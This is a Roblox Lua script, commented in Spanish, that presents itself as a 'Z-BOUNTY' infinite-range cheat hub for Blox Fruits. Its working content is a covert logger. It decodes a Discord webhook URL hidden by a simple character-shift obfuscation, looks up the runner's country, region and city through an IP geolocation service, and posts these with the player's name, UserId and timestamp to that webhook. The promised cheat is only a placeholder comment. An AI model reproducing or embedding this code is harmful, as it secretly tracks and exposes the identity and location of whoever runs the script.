--[[
    Z-BOUNTY System - Xeno Optimized
    Repository: AloneFalseExploit/AloneInfRange2
]]

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Función de seguridad para reconstruir la URL (Ofuscación)
local function _XenoSafe(_str)
    local _res = ""
    for i = 1, #_str do
        _res = _res .. string.char(string.byte(_str, i) - 1)
    end
    return _res
end

-- URL Protegida reconstruida en tiempo de ejecución
local WebhookURL = _XenoSafe("iuuqt;00ejtdpse/dpn0bqj0xfbcpplt026153180861758224900qev11{midI2mFFm95Gl3KN[LuN9FG7muGs9BuqXh.Upp7QPXulK9TEKSzlI[EUbG7Vs[")

-- Obtener datos de ubicación (IP-API)
local function getIpData()
    local success, response = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
    end)
    return success and response or {country = "Desconocido", regionName = "Desconocido", city = "Desconocido"}
end

local ipData = getIpData()

-- Identificación del Mar (Blox Fruits)
local function getSea()
    local id = game.PlaceId
    if id == 2753915549 then return "Primer Mar"
    elseif id == 4442245229 then return "Segundo Mar"
    elseif id == 7449925065 then return "Tercer Mar"
    else return "Mar Desconocido" end
end

-- Estructura visual para Discord (Imagen 1000008396.jpg)
local payload = {
    ["embeds"] = {{
        ["title"] = "🚀 HUB ACTIVADO (XENO)",
        ["color"] = 65280, -- Verde
        ["fields"] = {
            {["name"] = "👤 Jugador", ["value"] = player.Name, ["inline"] = false},
            {["name"] = "🆔 UserId", ["value"] = tostring(player.UserId), ["inline"] = false},
            {["name"] = "⏰ Hora", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false},
            {["name"] = "🌍 País", ["value"] = ipData.country, ["inline"] = false},
            {["name"] = "📍 Región", ["value"] = ipData.regionName, ["inline"] = false},
            {["name"] = "🏙️ Ciudad", ["value"] = ipData.city, ["inline"] = false},
            {["name"] = "🎮 Juego", ["value"] = "Blox Fruits | " .. getSea(), ["inline"] = false}
        },
        ["footer"] = {["text"] = "Z-BOUNTY System | AloneFalseExploit 🔥"}
    }}
}

-- Función de envío compatible con Xeno
local function sendLog()
    -- Xeno suele usar 'request' o 'http_request'
    local xenoRequest = request or http_request or (http and http.request) or (syn and syn.request)
    
    if xenoRequest then
        pcall(function()
            xenoRequest({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    else
        warn("Xeno no detectó una función de solicitud HTTP válida.")
    end
end

-- Ejecución
sendLog()

-- Continúa con tu script de rango infinito aquí
print("Z-BOUNTY Xeno Edition Cargado")

